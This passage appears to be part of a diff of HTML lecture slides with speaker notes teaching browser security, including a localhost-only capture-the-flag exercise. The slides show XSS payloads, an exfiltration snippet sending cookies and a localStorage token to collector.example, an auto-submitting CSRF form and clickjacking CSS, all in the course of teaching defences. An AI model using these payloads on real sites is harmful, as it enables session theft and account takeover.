+    <p>1:00 → 1:15, debrief to 1:20 (use the causes in the previous slide's notes). Throttle: Slow 4G and 4× CPU, both from the Performance panel's gear. Pages 1–3 are the core; 4 and 5 are for pairs that finish early. Walk the room at minute 6 and ask for the <em>evidence</em>, not the fix — a pair that says "the image is slow" hasn't finished; "the image request starts after the script's, here in the waterfall" has. Page 3 has three separate shifts, so a pair that finds one is only a third done. The fixes are one line each; the write-up of the evidence is the deliverable. Page 5's cause is a <code>transform</code> on an ancestor, not the quiz's <code>opacity</code>, so the quiz doesn't hand over the answer. Solutions in <code>private/</code>.</p>
+  </aside>
+</section>
+
+<section class="breakslide no-chrome" data-act="B" data-act-name="Break" data-at="1:20" data-title="Break">
+  <p class="brk-kicker">// compositor thread only</p>
+  <h2>Break. <em>15&nbsp;min</em></h2>
+  <pre class="brk-code" aria-hidden="true"><span class="k">await</span> scheduler.<span class="f">yield</span>(); <span class="c">// stop blocking</span>
+<span class="k">await</span> coffee; <span class="c">// then: who else runs code on your page?</span></pre>
+  <button class="timer" data-min="15"></button>
+  <p>After the break: origins, XSS, CSP — and a CTF on your own laptop.</p>
+  <aside class="notes">
+    <p>Start the timer. Before they leave: ask them to clone or open the recipe site for the CTF, so nobody spends the first five minutes of Act 3 downloading. Everything runs on their own <code>localhost</code>.</p>
+  </aside>
+</section>
+
+<!-- =====================================================================
+     ACT 3 · ORIGINS AND ATTACKS
+     ===================================================================== -->
+
+<section class="act" data-act="3" data-act-name="Origins and attacks" data-at="1:35" data-title="Act 3 — Origins and attacks">
+  <div class="act-deco">⚠</div>
+  <div class="act-num">act 03</div>
+  <h1>Origins and attacks</h1>
+  <div class="act-meta"><span class="chip">1:35 – 2:20</span><span>the same processes, as a security model</span></div>
+  <div class="act-list"><span>same-origin policy</span><span>XSS</span><span>sinks</span><span>sanitising</span><span>Trusted Types</span><span>CSP</span><span>cookies</span><span>CSRF</span><span>clickjacking</span><span>sandbox</span><span>postMessage</span></div>
+</section>
+
+<section data-title="The threat model">
+  <p class="kicker">The running example · a recipe site with comments</p>
+  <h2>Your page runs other people's code, side by side</h2>
+  <div class="procs">
+    <div class="p one"><b>your origin</b><strong>Your code</strong><span>Full access: DOM, cookies, storage, your API with the user's session.</span><span class="n">trusted</span></div>
+    <div class="p many"><b>your origin</b><strong>Your dependencies</strong><span>Same access as your code. A CDN script is your code (Lecture 10).</span><span class="n">trusted by accident</span></div>
+    <div class="p gpu"><b>other origin</b><strong>Frames you embed</strong><span>Own origin; cross-site frames get their own process. Can't read your DOM; can send you messages.</span><span class="n">bounded</span></div>
+    <div class="p util"><b>anyone</b><strong>User content</strong><span>Comments, URLs, API responses. Data — until you let it become code.</span><span class="n">untrusted</span></div>
+  </div>
+  <ul class="tightlist">
+    <li>The <strong>same-origin policy</strong> (Lecture 8) is the main boundary: scheme + host + port.</li>
+    <li>The client <strong>holds no secrets</strong> (Meridian): anything the page knows, the user can read.</li>
+    <li>Every attack below gives column 4, or another site the user has open, the rights of column 1.</li>
+  </ul>
+  <aside class="notes">
+    <p>~1:35. Set the frame for the whole act: we are not defending against the user — the user owns the browser. We are defending the user against <em>other people's content</em> on our origin, and defending our origin against other sites. The recipe site has comments, a search that echoes the query, a share-by-link feature and an embeddable widget: one of each.</p>
+  </aside>
+</section>
+
+<section data-title="XSS">
+  <p class="kicker">Cross-site scripting</p>
+  <h2>If an attacker's script runs on your origin, the SOP protects <em class="s">it</em></h2>
+  <div class="split l2 center">
+    <script type="text/x-code" data-lang="js" class="xs">// attacker JavaScript, running on recipes.example
+fetch("https://collector.example/x", {
+  method: "POST",
+  body: JSON.stringify({
+    html: document.documentElement.innerHTML,
+    ck: document.cookie,        // no HttpOnly
+    token: localStorage.token,  // anything stored
+  }),
+});
+
+fetch("/api/account/email", {      // as the user
+  method: "PUT",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ email: "attacker@example" }),
+});</script>
+    <ul>
+      <li>It is <strong>your origin</strong>, so the browser allows all of it: same-origin reads, your cookies, your API.</li>
+      <li>The SOP limits <em>reading</em> responses, not sending requests: the exfiltration POST goes out.</li>
+      <li>A password field, a 2FA code, anything the page renders — all readable from the DOM as the user types.</li>
+      <li>Every defence after this slide exists because this code is so cheap to run.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~1:38. Say the sentence clearly: an XSS makes the attacker's code <em>become</em> your site. That is why "it's only a comment field" is never only a comment field, and why severity doesn't depend on what the demo payload does. <code>alert(1)</code> in a bug report is a proof of access, not the attack. Also kill the common defence-by-obscurity idea: minified code, obfuscated endpoints and "the token is in a weird key" change nothing here.</p>
+  </aside>
+</section>
+
+<section data-title="Three kinds">
+  <p class="kicker">Where the payload comes from</p>
+  <h2>Stored, reflected, DOM-based</h2>
+  <div class="vs3">
+    <div>
+      <h3>stored</h3>
+<pre class="raw xs"><span class="c">// a comment in the database</span>
+Lovely recipe!
+&lt;img src=x onerror=…&gt;
+
+<span class="c">// rendered for</span>
+<span class="c">// every visitor</span></pre>
+      <p class="muted">Worst: it runs for everyone, including admins, with no link to click.</p>
+    </div>
+    <div>
+      <h3>reflected</h3>
+<pre class="raw xs"><span class="c">// the server echoes</span>
+<span class="c">// the query back</span>
+/search?q=&lt;img …&gt;
+
+&lt;p&gt;No results for
+  &lt;img src=x onerror=…&gt;
+&lt;/p&gt;</pre>
+      <p class="muted">Needs a link or a form the victim submits. Phishing-sized.</p>
+    </div>
+    <div>
+      <h3>DOM-based</h3>
+<pre class="raw xs"><span class="c">// the server never</span>
+<span class="c">// sees the payload</span>
+/recipe#tip=&lt;img …&gt;
+
+box.innerHTML =
+  decodeURIComponent(
+    location.hash.slice(5));</pre>
+      <p class="muted">Pure client-side bug. The fragment is never sent to the server.</p>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~1:40. The split matters for how you find them: stored and reflected show up in server logs and server-side tests; fragment-based DOM XSS is invisible there — the fragment after <code>#</code> never leaves the browser, so no WAF, no log, no server-side template engine is involved. That is also why "we escape everything in the templates" is not a complete answer for a single-page app: the dangerous assignment happens in JavaScript.</p>
+  </aside>
+</section>
+
+<section data-title="Sources and sinks">
+  <p class="kicker">The shape of every DOM XSS</p>
+  <h2>Untrusted data flows from a source into a sink</h2>
+  <div class="vs2">
+    <div>
+      <h3>sources · data you don't control</h3>
+      <ul class="tightlist">
+        <li><code>location.href</code>, <code>.search</code>, <code>.hash</code>, <code>document.referrer</code></li>
+        <li><code>event.data</code> from <code>postMessage</code></li>
+        <li>API responses, including your own</li>
+        <li><code>localStorage</code>, <code>sessionStorage</code>, cookies, IndexedDB</li>
+        <li><code>name</code> of a window, a form field, a file name</li>
+      </ul>
+    </div>
+    <div>
+      <h3>sinks · places that parse or execute</h3>
+      <ul class="tightlist">
+        <li><code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code>, <code>document.write</code>, <code>srcdoc</code></li>
+        <li><code>eval</code>, <code>new Function</code>, <code>setTimeout("…")</code></li>
+        <li><code>href</code>, <code>src</code>, <code>location</code> set to a <code>javascript:</code> URL</li>
+        <li><code>el.setAttribute("onclick", …)</code> or any other <code>on*</code> attribute</li>
+        <li>a <code>&lt;script src&gt;</code> whose URL comes from data</li>
+      </ul>
+    </div>
+  </div>
+  <p>Auditing a page is this one question, repeated: <strong>does any source reach any sink?</strong></p>
+  <aside class="notes">
+    <p>~1:43. Give them the grep: search the project for the sink names, then trace backwards. Most real code bases have fewer than twenty hits, and each one is a yes/no question. Note the trap in the sources list: <strong>your own API</strong> is a source, because the comment in the database came from a user. "It's our data" is where stored XSS lives.</p>
+  </aside>
+</section>
+
+<section class="quiz" data-title="Does it run?">
+  <p class="kicker">Quick check · three payloads, one sink</p>
+  <h2>Which of these executes?</h2>
+  <div class="split l2 center">
+    <script type="text/x-code" data-lang="js" class="small">box.innerHTML = '<script>alert(1)<\/script>';
+
+box.innerHTML = '<img src=x onerror=alert(1)>';
+
+box.innerHTML = '<svg><animate onbegin=alert(1)'
+              + ' attributeName=x dur=1s>';</script>
+    <div class="stack">
+      <div class="reveal-box step solid">The first does <strong>not</strong> run. The second and third do.</div>
+      <div class="reveal-box step"><code>&lt;script&gt;</code> elements created by parsing a string are flagged "already started" and never run.</div>
+      <div class="reveal-box step">Event-handler attributes have no such rule, and there are hundreds of them. <em class="s">Filtering &lt;script&gt; is not a defence.</em></div>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~1:45. Let someone try it in the console on a scratch page. The "no <code>&lt;script&gt;</code>" rule is a spec detail about scripts inserted by parsing a string, and it fools a lot of people into thinking <code>innerHTML</code> is safe. Other payloads with no <code>&lt;script&gt;</code> in sight: <code>&lt;iframe srcdoc&gt;</code>, <code>&lt;a href="javascript:…"&gt;</code> that the page then clicks, <code>&lt;input autofocus onfocus&gt;</code>. Blocklists lose; the next slides are the things that win. The <code>&lt;\/script&gt;</code> on the slide is escaped so the line can sit inside a real <code>&lt;script&gt;</code> without closing it; in the console, type it either way.</p>
+  </aside>
+</section>
+
+<section data-title="Defence 1: don't parse">
+  <p class="kicker">Defence 1 · the one that always works</p>
+  <h2>Untrusted text goes in as <em class="s">text</em></h2>
+  <div class="vs2">
+    <div>
+      <h3>no</h3>
+      <script type="text/x-code" data-lang="js" class="xs">li.innerHTML = `
+  <b>${comment.author}</b>
+  <p>${comment.body}</p>`;
+
+list.insertAdjacentHTML("beforeend", row);</script>
+    </div>
+    <div>
+      <h3>yes</h3>
+      <script type="text/x-code" data-lang="js" class="xs">const frag = tpl.content.cloneNode(true);
+frag.querySelector("b").textContent = comment.author;
+frag.querySelector("p").textContent = comment.body;
+list.append(frag);
+
+// URLs: check the scheme too
+a.textContent = link.title;
+const url = new URL(link.href, location);
+if (url.protocol === "https:") a.href = url;</script>
+    </div>
+  </div>
+  <ul class="tightlist">
+    <li><code>textContent</code> never parses: <code>&lt;img …&gt;</code> arrives as visible text.</li>
+    <li><code>&lt;template&gt;</code> + <code>cloneNode</code> + <code>textContent</code> is the render pattern from Lecture 5, and it was already safe.</li>
+    <li>URLs still need a check: <code>textContent</code> can't help an <code>href="javascript:…"</code>.</li>
+  </ul>
+  <aside class="notes">
+    <p>~1:48. Escaping, if it comes up, is context-dependent: HTML text, an attribute value, a URL and a JavaScript string all need different rules — which is why "insert as text" beats "escape correctly". Say plainly that this covers the overwhelming majority of real cases: almost nobody needs user-supplied HTML. When a framework is in play the same rule has a different name — React's <code>dangerouslySetInnerHTML</code>, Vue's <code>v-html</code>, Angular's <code>bypassSecurityTrustHtml</code> — and each one is a grep worth doing. The exception is a rich-text editor's output, which is the next slide.</p>
+  </aside>
+</section>
+
+<section data-title="Defence 2: sanitise">
+  <p class="kicker">Defence 2 · when you genuinely need HTML</p>
+  <h2>Let a sanitiser decide which tags survive</h2>
+  <div class="split l2 center">
+    <script type="text/x-code" data-lang="js" class="xs">// built in: the Sanitizer API — check support
+box.setHTML(comment.body);  // drops scripts, handlers
+box.setHTML(comment.body, {
+  sanitizer: { elements: ["b", "i", "a", "p"] },
+});
+
+// the established library
+import DOMPurify from "dompurify";  // pinned, Lecture 10
+box.innerHTML = DOMPurify.sanitize(comment.body);</script>
+    <ul>
+      <li>An allowlist of elements and attributes, applied after parsing — never a regex over the string.</li>
+      <li>Sanitise as late as possible, on output. Storing sanitised HTML means a bug in the sanitiser is now permanent.</li>
+      <li><code>setHTML()</code> is new and engine support still differs: keep a library fallback.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~1:51. Check caniuse the morning of the class for <code>setHTML()</code> and Trusted Types, and say the date and versions out loud. The Sanitizer API's shape changed more than once during standardisation, so verify on MDN before demoing. DOMPurify is the battle-tested option and is the one to use in the exercise. One concrete example of context-dependent escaping: <code>&lt;a title="</code> + user text is fine escaped for HTML, but the same text in <code>href</code> can still be <code>javascript:</code>.</p>
+  </aside>
+</section>
+
+<section data-title="Defence 3: Trusted Types">
+  <p class="kicker">Defence 3 · make the unsafe thing impossible</p>
+  <h2>Sinks stop accepting strings at all</h2>
+  <div class="split l2 center">
+    <div class="stack">
+<pre class="raw sm"><span class="c">// a CSP response header (next slide)</span>
+Content-Security-Policy:
+  require-trusted-types-for <span class="s">'script'</span>;
+  trusted-types recipes-policy dompurify;</pre>
+      <script type="text/x-code" data-lang="js" class="xs">const policy = trustedTypes.createPolicy("recipes-policy", {
+  createHTML: (s) => DOMPurify.sanitize(s),
+});
+
+box.innerHTML = policy.createHTML(comment.body);  // ok
+box.innerHTML = comment.body;                     // TypeError</script>
+    </div>
+    <ul>
+      <li>With the policy on, assigning a plain string to <code>innerHTML</code> <strong>throws</strong>: "did we sanitise everywhere?" becomes a type error.</li>
+      <li>Every unsafe assignment has to go through a named policy — one place to review, one place to fix.</li>
+      <li>You find them all at once: turn it on in report-only mode and read the violation reports.</li>
+      <li>The code it forces you to write is safe in every browser, whether or not that browser enforces it.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~1:53. This is how large sites eliminate DOM XSS as a class rather than fixing instances: Google has published that Trusted Types plus a strict CSP removed almost all of their DOM XSS reports. Partial support is fine — it is a development-time guarantee. Guard the policy with <code>if (window.trustedTypes)</code> (or a tinyfill) so the same code runs where the API is missing. The header names <code>dompurify</code> too: DOMPurify creates its own policy, and without it <code>sanitize()</code> silently returns an empty string under enforcement. Keep the number of policies small; a policy named "default" applies everywhere and is a tempting escape hatch.</p>
+  </aside>
+</section>
+
+<section data-title="CSP">
+  <p class="kicker">Content Security Policy</p>
+  <h2>A header that says where code may come from</h2>
+  <div class="split l2 center">
+    <div class="stack">
+<pre class="raw sm"><span class="c">// a strict, nonce-based policy</span>
+Content-Security-Policy:
+  script-src <span class="s">'nonce-r4nd0m'</span> <span class="s">'strict-dynamic'</span>;
+  object-src <span class="s">'none'</span>;
+  base-uri <span class="s">'none'</span>;
+  require-trusted-types-for <span class="s">'script'</span>;</pre>
+<pre class="raw sm"><span class="c">// and in the page, per response</span>
+&lt;script nonce=<span class="s">"r4nd0m"</span> src=<span class="s">"/app.js"</span>&gt;&lt;/script&gt;
+&lt;script&gt;trackPageView()&lt;/script&gt;   <span class="r">← blocked: no nonce</span></pre>
+    </div>
+    <ul>
+      <li>A <code>&lt;script&gt;</code> injected into server-rendered HTML (stored or reflected) has no nonce, so the browser refuses to run it.</li>
+      <li><strong>Inline event handlers are blocked</strong> by any <code>script-src</code> without <code>'unsafe-inline'</code>: <code>onerror=</code> stops working.</li>
+      <li>The nonce is new on <strong>every response</strong>. A nonce in a cached static file protects nothing.</li>
+      <li><code>'strict-dynamic'</code> lets a trusted script load more scripts, so bundlers and loaders still work.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~1:56. Why nonces beat host allowlists: <code>script-src https://cdn.example</code> trusts every file on that CDN, including some old AngularJS copy that will happily evaluate a template from the DOM. Google's research on real policies found host allowlists bypassable on the large majority of sites, which is why the recommended shape is nonce + <code>'strict-dynamic'</code>. Its limit: a trusted script can still create <code>&lt;script src&gt;</code> from data — the last sink on the sources-and-sinks slide. CSP is a <strong>second</strong> line: it does not fix the injection, it limits what the injection can do.</p>
+  </aside>
+</section>
+
+<section data-title="Shipping a CSP">
+  <p class="kicker">How to turn it on without breaking the site</p>
+  <h2>Report-only first, and know what <code>&lt;meta&gt;</code> can't do</h2>
+  <div class="vs2">
+    <div>
+      <h3>the rollout</h3>
+      <ol>
+        <li><code>Content-Security-Policy-Report-Only</code> with the strict policy.</li>
+        <li>Collect violations (<code>report-to</code>, or the console) for a week.</li>
+        <li>Fix your own page: nonces on scripts, inline handlers moved into JavaScript.</li>
+        <li>Switch the header to enforcing. Keep report-only for the next tightening.</li>
+      </ol>
+    </div>
+    <div>
+      <h3><code>&lt;meta&gt;</code> vs header</h3>
+      <table class="dtable tiny">
+        <tr><th></th><th><code>&lt;meta&gt;</code></th><th>header</th></tr>
+        <tr><td><code>script-src</code></td><td class="yes">yes</td><td class="yes">yes</td></tr>
+        <tr><td><code>frame-ancestors</code></td><td class="no">ignored</td><td class="yes">yes</td></tr>
+        <tr><td>report-only</td><td class="no">not available</td><td class="yes">yes</td></tr>
+        <tr><td>applies to</td><td class="some">from the tag onwards</td><td class="yes">the whole response</td></tr>
+      </table>
+      <p class="muted">Static hosting (GitHub Pages) can only use <code>&lt;meta&gt;</code> — so clickjacking defence needs a host that sets headers.</p>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~1:59. Skip if late. Practical for their own projects: a <code>&lt;meta&gt;</code> CSP on a static page is worth having and blocks inline handlers and injected scripts; it just can't say who may frame you. Netlify, Cloudflare Pages and Workers can set real headers. Keep the nonce point in mind: static hosting can't mint a per-response nonce, so a static site's CSP uses hashes (<code>'sha256-…'</code>) or <code>'self'</code> instead.</p>
+  </aside>
+</section>
+
+<section data-title="Cookies">
+  <p class="kicker">Where a session should live</p>
+  <h2>Cookie attributes, and why <code>localStorage</code> has none</h2>
+  <table class="dtable tight">
+    <tr><th>attribute</th><th>effect</th><th>stops</th></tr>
+    <tr><td><code>HttpOnly</code></td><td>invisible to <code>document.cookie</code></td><td class="yes">an XSS reading the session</td></tr>
+    <tr><td><code>Secure</code></td><td>sent over HTTPS only</td><td class="yes">network interception, downgrade</td></tr>
+    <tr><td><code>SameSite=Lax</code></td><td>sent cross-site only on top-level GET navigations</td><td class="yes">most CSRF — set it explicitly</td></tr>
+    <tr><td><code>SameSite=Strict</code></td><td>never sent cross-site, even on a link</td><td class="some">more CSRF; logs the user out of inbound links</td></tr>
+    <tr><td><code>__Host-</code> prefix</td><td>requires <code>Secure</code>, <code>Path=/</code>, no <code>Domain</code></td><td class="yes">a subdomain overwriting your cookie</td></tr>
+    <tr><td><code>localStorage</code> token</td><td>plain JavaScript access, no attributes at all</td><td class="no">nothing: any XSS reads it</td></tr>
+  </table>
+  <p>In the CTF you will read a token out of <code>localStorage</code> through an XSS, and <strong>fail</strong> to read the <code>HttpOnly</code> cookie beside it.</p>
+  <aside class="notes">
+    <p>~2:01. The honest nuance: <code>HttpOnly</code> doesn't stop an XSS from <em>using</em> the session — the attacker's <code>fetch</code> still carries the cookie. It stops exfiltration, which turns a permanent account takeover into an attack that only works while the page is open. That is a real difference, and it is why a token in <code>localStorage</code> is strictly worse than a cookie you can't read. On <code>SameSite</code>: only Chromium defaults to <code>Lax</code>, and even there a fresh cookie is sent on cross-site POSTs for two minutes ("Lax+POST"). Firefox and Safari have no such default. Always set the attribute.</p>
+  </aside>
+</section>
+
+<section data-title="CSRF">
+  <p class="kicker">No script on your page needed</p>
+  <h2>Another site makes the browser send <em class="s">your</em> cookies</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// on evil.example, while the user is logged in</span>
+&lt;form action=<span class="s">"https://recipes.example/account/delete"</span>
+      method=<span class="s">"POST"</span>&gt;
+  &lt;input type=<span class="s">"hidden"</span> name=<span class="s">"confirm"</span> value=<span class="s">"yes"</span>&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
+
+<span class="c">// the server sees a normal, authenticated POST</span>
+<span class="c">// and these headers:</span>
+Sec-Fetch-Site: cross-site
+Origin: https://evil.example</pre>
+    <ul>
+      <li>The attacker can't <em>read</em> the response (SOP) — the write already happened.</li>
+      <li>A cookie set with <code>SameSite=Lax</code> isn't sent on a cross-site POST, so the form arrives logged out.</li>
+      <li>Belt and braces on the server: check <code>Sec-Fetch-Site</code> / <code>Origin</code>, or a per-session CSRF token.</li>
+      <li>Any state-changing request should be a POST/PUT/DELETE, never a GET a link can trigger.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~2:04. Why it still matters with <code>Lax</code> set: top-level GET navigations <em>do</em> send the cookie, so a GET that changes state ("/unsubscribe?id=…") is still exploitable with a plain link; and an API that accepts JSON with <code>SameSite=None</code> cookies for a legitimate cross-site setup is back to square one. The modern minimum: <code>SameSite=Lax</code> plus an <code>Origin</code> check on the server.</p>
+  </aside>
+</section>
+
+<section class="quiz" data-title="Which carry the cookie?">
+  <p class="kicker">Quick check · the session cookie is set with <code>SameSite=Lax</code></p>
+  <h2>evil.example does each of these. Which carry the cookie?</h2>
+  <div class="split l2 center">
+<pre class="raw sm"><span class="c">// on evil.example, user logged in to recipes.example</span>
+<span class="n">1</span>  &lt;a href=<span class="s">"https://recipes.example/saved"</span>&gt;  <span class="c">clicked</span>
+<span class="n">2</span>  &lt;form method=<span class="s">"POST"</span> action=<span class="s">"https://recipes.example/…"</span>&gt;
+<span class="n">3</span>  &lt;img src=<span class="s">"https://recipes.example/avatar.png"</span>&gt;
+<span class="n">4</span>  &lt;iframe src=<span class="s">"https://recipes.example/account"</span>&gt;
+<span class="n">5</span>  fetch(<span class="s">"https://recipes.example/api/me"</span>,
+       { credentials: <span class="s">"include"</span> })</pre>
+    <div class="stack">
+      <div class="reveal-box step solid">Only <strong>1</strong>: a top-level GET navigation. 2–5 arrive without the cookie.</div>
+      <div class="reveal-box step">So a GET that changes state is still exploitable with a plain link.</div>
+      <div class="reveal-box step">And 4 is why a <code>Lax</code> session already blunts clickjacking: the framed page loads logged out.</div>
+    </div>
+  </div>
+  <aside class="notes">
+    <p>~2:06. Votes per line before revealing. Caveat if someone tests in Chrome with a cookie that has <em>no</em> <code>SameSite</code> attribute: Chromium treats it as <code>Lax</code> but still sends it on a cross-site POST for two minutes after it was set. With the attribute set explicitly, the answer above holds in every engine.</p>
+  </aside>
+</section>
+
+<section data-title="Clickjacking">
+  <p class="kicker">Your page, invisible, under their button</p>
+  <h2>The user clicks "Play". The click lands on "Delete account"</h2>
+  <div class="split l2 center">
+    <div class="stack">
+      <script type="text/x-code" data-lang="css" class="xs">/* on evil.example: your real page, logged in */
+iframe {
+  position: fixed; inset: 0;
+  opacity: 0.0001;   /* invisible, clickable */
+  z-index: 10;
+}</script>
+<pre class="raw sm"><span class="c">// the fix, as a response header</span>
+Content-Security-Policy: frame-ancestors <span class="s">'none'</span>;
+<span class="c">// or, to allow your own pages only</span>
+Content-Security-Policy: frame-ancestors <span class="s">'self'</span>;
+
+<span class="c">// the older header, still understood</span>
+X-Frame-Options: DENY</pre>
+    </div>
+    <ul>
+      <li>Nothing is read and nothing is injected: the attacker borrows the user's clicks.</li>
+      <li><code>frame-ancestors</code> says who may frame you — a directive <code>&lt;meta&gt;</code> cannot set.</li>
+      <li>Default to <code>'none'</code> for anything with a destructive action or a session.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~2:09. Historical note worth 20 seconds: this is why important dialogs moved into the browser UI (permission prompts, the file picker) — page-drawn confirmations can be framed and covered, browser-drawn ones cannot. Also mention that <code>sticky</code> overlays and "are you sure?" modals are not protection, and that <code>SameSite=Lax</code> or <code>Strict</code> is a strong mitigation: a cross-site frame doesn't get the session cookie, so the framed page loads logged out. The attack needs a <code>SameSite=None</code> session or a same-site attacker. The CTF works because <code>localhost</code> on another port is the same site — say so at the debrief.</p>
+  </aside>
+</section>
+
+<section data-title="Frames you embed">
+  <p class="kicker">The other direction</p>
+  <h2>Embedding someone else's page: say what it may do</h2>
+  <div class="split l2 center">
+<pre class="raw sm">&lt;iframe src=<span class="s">"https://widgets.example/print"</span>
+  <span class="n">sandbox</span>=<span class="s">"allow-scripts allow-same-origin allow-modals"</span>
+  <span class="n">allow</span>=<span class="s">"fullscreen"</span>
+  <span class="n">referrerpolicy</span>=<span class="s">"no-referrer"</span>
+  <span class="n">loading</span>=<span class="s">"lazy"</span>&gt;&lt;/iframe&gt;</pre>
+    <ul>
+      <li><code>sandbox</code> with no value removes everything: no scripts, no forms, no popups, and a <strong>unique opaque origin</strong>.</li>
+      <li>Add back only what the widget needs: <code>allow-scripts</code>, <code>allow-forms</code>, <code>allow-modals</code> (for <code>print()</code>), <code>allow-same-origin</code> (its real origin, so messages carry it).</li>
+      <li><code>allow-scripts allow-same-origin</code> on a frame of <em>your own</em> origin gives it full access again — that pair is the trap.</li>
+      <li><code>allow</code> is Permissions Policy (Lecture 11): a cross-origin frame gets fullscreen, camera, geolocation only if listed.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~2:11. The pattern to remember: a sandboxed iframe is the only real way to run untrusted HTML or a third-party script with a boundary around it — same-origin isolation inside your page does not exist, since a script on your origin can reach everything. If a product requires "embed this snippet", an iframe keeps it out of your DOM; a <code>&lt;script&gt;</code> tag does not (Lecture 10).</p>
+  </aside>
+</section>
+
+<section data-title="postMessage">
+  <p class="kicker">Talking across the boundary on purpose</p>
+  <h2>Two checks, every time</h2>
+  <div class="split l2 center">
+    <script type="text/x-code" data-lang="js" class="xs">// receiving — in the page that embeds the widget
+addEventListener("message", (e) => {
+  // 1. who sent it, and from which frame
+  if (e.origin !== "https://widgets.example") return;
+  if (e.source !== frame.contentWindow) return;
+  // 2. validate the shape
+  if (e.data?.type !== "print-ready") return;
+  showPrintButton(Number(e.data.pages) || 1);
+});
+
+// sending — never "*" when the data matters
+frame.contentWindow.postMessage(
+  { type: "recipe", id }, "https://widgets.example");</script>
+    <ul>
+      <li>Any window that has a reference to yours can post to you: a frame, an opener, a popup.</li>
+      <li>Without the <code>origin</code> check, the message channel is an open API on your origin.</li>
+      <li><code>"*"</code> as the target means whatever origin the frame has navigated to can read the message.</li>
+      <li><code>event.data</code> is a <strong>source</strong>: it must never reach a sink unchecked.</li>
+    </ul>
+  </div>
+  <aside class="notes">
+    <p>~2:13. This is flag 4 in the CTF, in the other direction: there the vulnerable receiver is the widget, listening to its parent. Its check compares <code>e.origin</code> to the embedder's origin and <code>e.source</code> to <code>parent</code>. The widget acts on any message, so a page the attacker controls frames it and sends one. Two refinements if asked: <code>MessageChannel</code> gives you a private port pair so you don't have to filter at all, and <code>e.origin</code> on a sandboxed frame's message is <code>"null"</code> — comparing it to a string you expect will correctly fail.</p>
+    <p>If asked about <code>target="_blank"</code>: it implies <code>noopener</code> in every current browser, so the opened page can't navigate yours (tab-napping); <code>window.open</code> doesn't, and needs the flag. <code>Cross-Origin-Opener-Policy: same-origin</code> cuts the link for every window, and together with COEP it lets a page use <code>SharedArrayBuffer</code> and precise timers, which browsers disabled after Spectre.</p>
+  </aside>
+</section>
+
+
+
+<section data-title="Checklist">
+  <p class="kicker">Act 3 on one slide</p>
+  <h2>The checklist for a page you ship</h2>
+  <ol>
+    <li><strong>No untrusted data in an HTML sink.</strong> <code>textContent</code> and <code>&lt;template&gt;</code>; sanitise only when HTML is the feature.</li>
+    <li><strong>A CSP</strong>, nonce-based, report-only first. <code>require-trusted-types-for 'script'</code> if you can.</li>
+    <li><strong>Session in a cookie</strong>: <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>, <code>__Host-</code>. No tokens in <code>localStorage</code>.</li>
+    <li><strong>State changes are POST</strong>, with an <code>Origin</code> / <code>Sec-Fetch-Site</code> check on the server.</li>
+    <li><strong><code>frame-ancestors</code></strong> on anything with a destructive action.</li>
+    <li><strong>Frames in</strong>: <code>sandbox</code> + <code>allow</code>. <strong>Messages in</strong>: check <code>origin</code> and shape.</li>
+    <li><strong>Dependencies</strong>: pinned versions, <code>integrity</code>, as few as possible (Lecture 10).</li>
+  </ol>
+  <aside class="notes">
+    <p>~2:16. Read it as the CTF brief: each flag in the next exercise is one of these lines missing. Tell them the order matters — lines 1, 4 and 5 prevent; lines 2 and 3 limit the damage when line 1 fails. A site with a perfect CSP and an unsanitised comment field is still breached; a site with line 1 right and nothing else is in decent shape.</p>
+  </aside>
+</section>
+
+<!-- =====================================================================
+     EXERCISE 2 · CTF
+     ===================================================================== -->
+
+<section class="exercise" data-act="3" data-act-name="Exercise 2 · Break it, then fix it" data-at="2:20" data-title="Exercise 2 — Break it, then fix it">
+  <span class="sticker your-turn">ctf</span>
+  <p class="kicker">Exercise 2 · pairs or alone · 18 min, then part 2 · scored on the board</p>
+  <div class="ex-head"><h2>Break it, then fix it</h2><button class="timer" data-min="18"></button></div>
+  <p>A recipe site on your <code>localhost</code>: comments, search, share-by-link, a print widget, a session cookie, a <code>localStorage</code> token.</p>
+  <table class="dtable">
+    <tr><th>⚑</th><th>flag</th><th>what it proves</th></tr>
+    <tr><td>1</td><td>a comment that runs code for every visitor</td><td>stored XSS</td></tr>
+    <tr><td>2</td><td>a share link that runs code when opened</td><td>an XSS the server never sees</td></tr>
+    <tr><td>3</td><td>read the <code>localStorage</code> token through your XSS</td><td>…and fail to read the <code>HttpOnly</code> cookie</td></tr>
+    <tr><td>4</td><td>make the print widget act on your message <span class="muted">· stretch</span></td><td>cross-window messaging</td></tr>
+    <tr><td>5</td><td>frame "delete account" under a decoy button <span class="muted">· stretch</span></td><td>clickjacking</td></tr>
+  </table>
+  <p class="rule">Only against the course site on your own <code>localhost</code>. Your attacker pages run on a second <code>localhost</code> port. Nothing else.</p>
+  <p class="where">12-inside-the-browser → <b><a href="https://lopin.me/harbour/programming-interactivity-12-inside-the-browser/exercises/02-recipe-site/" target="_blank" rel="noopener">Exercise 2 · The recipe site</a></b></p>
+  <aside class="notes">
+    <p>2:20 → 2:38. Everyone runs their own copy; there is no shared target. Flags 1 and 2 are the warm-up and most people get both in ten minutes. Flag 3 is the one that teaches: the token comes out, the cookie doesn't. Flags 4 and 5 are stretch. They need a second page the students write themselves, served from a second <code>localhost</code> port — not opened from <code>file://</code>, which is cross-site, so a <code>Lax</code> session never reaches the frame and flag 5 fails silently. Flag 4 needs an HTML file with an iframe and a <code>postMessage</code>. Flag 5 needs an invisible iframe and a decoy, and its fix needs a response header — the recipe site's local server has to be able to send one. The search box is there on purpose: a reflected XSS through it is an unscored bonus. Put the five flags on the board and tick names as they land; nudge anyone stuck on 1 after eight minutes with the quiz payload.</p>
+  </aside>
+</section>
+
+<section class="exercise" data-title="Then fix it">
+  <span class="sticker your-turn">part 2</span>
